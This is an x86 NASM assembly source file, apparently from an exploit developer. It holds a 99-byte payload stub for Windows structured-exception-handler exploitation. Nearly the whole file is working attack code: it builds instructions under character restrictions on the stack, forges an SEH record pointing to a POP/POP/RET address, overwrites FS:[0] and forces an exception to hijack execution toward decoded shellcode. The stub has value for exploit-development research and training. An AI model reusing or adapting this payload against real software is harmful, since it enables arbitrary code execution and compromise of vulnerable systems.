;-----------------------------------------------------------------------------;
; Author: Helvio Junior - M4v3r1ck (helvio_junior[at]hotmail[dot]com)
; Version: 1.0 (13 August 2020)
; Size: 99 bytes
;-----------------------------------------------------------------------------;
;
; --> Input: The POP; POP; RET address must be pushed onto stack.
;
;-----------------------------------------------------------------------------;
;USAGE:
;
;   nasm payload.asm -o payload.o

[BITS 32]

global _start

section .text

_start:

    push 0x72742f29             ; Replace with P/P/R address  ** PLACEHOLDER **

    pop ebp                     ; POP from top of stack the POP; POP; RET address

                                ; Clear EAX
    push 0x41414141             ;   push 0x41414141 onto stack
    pop eax                     ;   pop 0x41414141 from stack to EAX
    xor eax,0x41414141          ;   do XOR between 0x41414141 and 0x41414141
    
                                ; Copy 0x00000000 to EBX
    push eax                    ;   push 0x00000000 from EAX onto stack
    pop ebx                     ;   pop 0x00000000 from stack to EBX
    
                                ; Caculate data to create NOPs (0x90)
    dec eax                     ;   decrement EAX down to -1 (0xffffffff)
    sub eax, 0x6f6f6f6f         ;   deduct 0x6f from 0xff resulting 0x90
    push eax                    ;   push 0x90909090 from EAX onto stack
    pop edi                     ;   pop 0x90909090 from stack to EDI
    
                                ; Set 0xffffffff to EAX
    push ebx                    ;   push 0x00000000 from EBX onto stack
    pop esi                     ;   pop 0x00000000 from stack to ESI
    dec esi                     ;   decrement ESI down to -1 (0xffffffff)

                                ; Copy SEH handler address to ESI
    and esi, DWORD [FS:EBX]     ;   do AND between 0xffffffff and [FS:0] address 
    PUSH esi                    ;   push [FS:0] onto stack

                                ; Set top of the stack equal [FS:0] address
    POP esp                     ;   pop [FS:0] address from esi to ESP

    ; start of decoder
    ; simulate an decoder pushing several INC ECX
    push 0x41414141
    push 0x41414141
    push 0x41414141
    push 0x41414141
    push 0x41414141
    push 0x41414141
    ; end of decoder


                                ; Clear EAX
    push 0x41414141             ;   push 0x41414141 onto stack
    pop eax                     ;   pop 0x41414141 from stack to EAX
    xor eax,0x41414141          ;   do XOR between 0x41414141 and 0x41414141
    
                                ; Copy 0x00000000 to EBX
    push eax                    ;   push 0x00000000 from EAX onto stack
    pop ebx                     ;   pop 0x00000000 from stack to EBX

                                ; Save decoded data address at ESI
    push esp                    ;   push ESP address onto stack
    pop esi                     ;   pop ESP address from stack to esi

                                ; Once we will use edi to calc no need to save our NOPs at EDX
    push edi                    ;   push 0x90909090 from EDI onto stack
    pop edx                     ;   pop 0x90909090 from stack to EDX

                                ; Align the stack to prevent data overwrite on raise exception
    push esp                    ;   push ESP address onto stack
    pop edi                     ;   pop ESP address from stack to EDI
    dec eax                     ;   decrement EAX down to -1 (0xffffffff)
    and eax, 0x40403040         ;   do an AND between 0xffffffff and 0x40403040 resulting 0x40403040
    and eax, 0x32325032         ;   do an AND between 0x40403040 and 0x32325032 resulting 0x00000100
    push eax                    ;   push 0x00000100 from EAX onto stack
    sub edi,[esp]               ;   deduct 0x0100 from ESP resulting ESP - 0x0100
    push edi                    ;   push (ESP - 0x0100) address onto stack
    pop esp                     ;   set new stack address

                                ; Restore our NOPs to EDI
    push edx                    ;   push 0x90909090 from EDX onto stack
    pop edi                     ;   pop 0x90909090 from stack to EDI

                                ; Create instruction "CALL EAX" onto stack
                                ;   call eax = 0xFFD0
    push edi                    ;   push 0x90909090 from EDI onto stack
    push edi                    ;   push 0x90909090 from EDI onto stack
    push ebx                    ;   push 0x00000000 from EBX onto stack
    pop eax                     ;   pop 0x00000000 from stack to EAX
    dec eax                     ;   decrement EAX down to -1 (0xffffffff)
    sub al, 0x2f                ;   deduct 0x2f from 0xff resulting 0xd0
    push eax                    ;   push 0xffffffd0 onto stack
    push eax                    ;   push 0xffffffd0 onto stack
    inc esp                     ;   inc esp 3 times in order to keep 0xffd0ffff on top of the stack
    inc esp                     ;
    inc esp                     ;
    pop eax                     ;   pop 0xffd0ffff from stack to EAX
    inc esp                     ;   increase EAX up to remove the last 0xff resulted from the 2x pushes
    push ax                     ;   push 0xffd0 from AX onto stack

                                ; Push onto stack 0x9090 in order to keep 4 bytes symmetry
    push di                     ;   PUSH 0x9090 from DI onto stack

                                ; Create instruction "mov eax, ???" onto stack
                                ;   where "???" is the decoded data memory address saved at ESI
                                ;   Example: mov eax,0x41414141 = B841414141
    push esi                    ;   push "decode data memory position" from ESI into stack 
    push ebx                    ;   push 0x00000000 from EBX onto stack
    pop eax                     ;   pop 0x00000000 from stack to EAX
    dec eax                     ;   decrement EAX down to -1 (0xffffffff)
    sub eax, 0x476f6f6f         ;   deduct 0x476f6f6f from 0xffffffff resulting 0xb8909090
    push eax                    ;   push 0xb8909090 onto stack

    
                                ; Add some padding onto stack
                                ;   it is necessary at least 3 times
    push edi                    ;   push 0x90909090 from EDI onto stack
    push edi                    ;   push 0x90909090 from EDI onto stack
    push edi                    ;   push 0x90909090 from EDI onto stack
    
                                ; Create SEH structure
                                ;   SEH handler
    push ebp                    ;   push POP; POP; RET address
                                ;   nSEH = 0x41417505 = instructions bellow
                                ;     INC ECX = increase ECX up = to set ZF (Zero Flag) = 0
                                ;     INC ECX = increase ECX up = to set ZF (Zero Flag) = 0
                                ;     jne 0x8 = JNE (Jump if not Equal) is taken if ZF = 0
                                ;   create instruction "jne 0x8" onto stack
                                ;     jne 0x8 = 0x7506
    push ebx                    ;     push 0x00000000 from EBX onto stack
    pop eax                     ;     pop 0x00000000 from stack to EAX
    dec eax                     ;     decrement EAX down to -1 (0xffffffff)
    sub ax, 0x7b69              ;     deduct 0x7b69 from 0xffff resulting 0x8496
    sub ax, 0x7e21              ;     deduct 0x7e21 from 0x8496 resulting 0x0675
    push ax                     ;     push 0x0675 onto stack
                                ;   create instruction "INC ECX" twice onto stack
                                ;     INC ECX = 0x41
    push word 0x4141            ;     push 0x4141 onto stack

                                ; Put our SEH record to top of chain
    push ebx                    ;   push 0x00000000 from EBX onto stack
    pop edi                     ;   pop 0x00000000 from stack to EDI
    and [fs:bx],edi             ;   set [fs:0] = 0x00000000
    inc edi                     ;   decrement EDI down to -1 (0xffffffff)
    sub [fs:bx],edi             ;   set [fs:0] = 0xffffffff
    and [fs:bx],esp             ;   set [fs:0] = ESP

                                ; Raise an exception
    xor WORD [ebx],si           ;   try to do an XOR operation with a protected/invalid memory address

